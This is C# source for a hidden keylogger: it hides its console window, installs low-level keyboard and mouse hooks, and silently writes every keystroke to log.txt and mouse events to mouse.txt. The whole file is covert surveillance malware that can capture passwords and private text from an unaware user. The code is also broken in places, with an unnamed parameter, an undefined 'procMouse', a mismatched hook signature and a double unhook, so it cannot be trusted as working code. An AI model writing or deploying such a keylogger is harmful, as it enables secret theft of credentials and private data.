using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WH_MOUSE = 7;
    private const int WH_MOUSE_LL = 14;
    private const int MK_LBUTTON = 0x0001;
    private const int MK_MBUTTON = 0x0010;
    private const int MK_RBUTTON = 0x0002;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static LowLevelMouseProc _procMouse = HookCallbackMouse;
    private static IntPtr _hookID = IntPtr.Zero;
    private static IntPtr _hookID2 = IntPtr.Zero;

    public static void Main()
    {
        var handle = GetConsoleWindow();


        ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);
        _hookID2 = SetHookMouse(_procMouse);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
        UnhookWindowsHookEx(_hookID);

        //  _hookID = SetHookMouse(_procMouse);
        //   Application.Run();
        // UnhookWindowsHookEx(_hookID);

    }

    private static IntPtr SetHookMouse(LowLevelMouseProc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_MOUSE_LL, procMouse,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    private delegate IntPtr LowLevelMouseProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallbackMouse(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)MK_LBUTTON)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((MouseButtons)vkCode);
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\mouse.txt", true);
            sw.WriteLine((MouseButtons)vkCode);
            sw.Close();
        }
        return CallNextHookEx(_hookID2, nCode, wParam, lParam);
    }

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

}